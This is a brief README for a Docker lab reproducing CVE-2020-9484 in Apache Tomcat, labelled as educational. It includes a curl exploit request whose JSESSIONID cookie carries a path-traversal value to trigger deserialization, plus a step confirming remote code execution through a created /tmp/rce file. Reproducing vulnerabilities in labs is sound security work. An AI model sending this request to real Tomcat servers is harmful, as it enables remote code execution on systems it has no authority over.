# CVE-2020-9484 (Tomcat)

For educational purposes only.

See Reference for the details.


## Run
```
$ cd CVE-2020-9484
$ docker build -t tomcat:groovy .
$ docker run -d -p 8080:8080 tomcat:groovy
```

## Exploit
```
$ curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy'
```

## Check
```
$ docker exec -it $CONTAINER /bin/sh
$ ls /tmp/rce
```
